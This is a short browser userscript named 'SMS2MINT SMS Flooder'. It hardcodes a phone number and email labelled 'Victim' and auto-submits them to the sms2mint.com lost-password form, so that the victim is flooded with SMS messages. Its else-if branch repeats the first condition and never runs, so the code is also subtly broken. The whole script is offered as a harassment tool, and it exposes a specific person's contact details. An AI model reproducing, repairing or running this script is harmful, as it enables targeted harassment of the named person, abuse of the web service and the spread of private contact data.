// ==UserScript==
// @name           SMS2MINT SMS Flooder BY SUNNY020
// @namespace      Chiraag
// @description    SMS Flooder
// @include        http://*sms2mint.com/*
// ==/UserScript==

var CustomerLogin="8872179641"; //Victim
var CustomerEmail="yastikakaushal@india.com"; //Victim's email

if(document.location=="http://m.sms2mint.com/users/lossPassword")
{
	document.forms[0].elements[1].value=CustomerLogin;
	document.forms[0].elements[2].value=CustomerEmail;
	document.forms[0].elements[3].click();
}
else if(document.location=="http://m.sms2mint.com/users/lossPassword")
{
	document.location="http://m.sms2mint.com/users/lossPassword";
}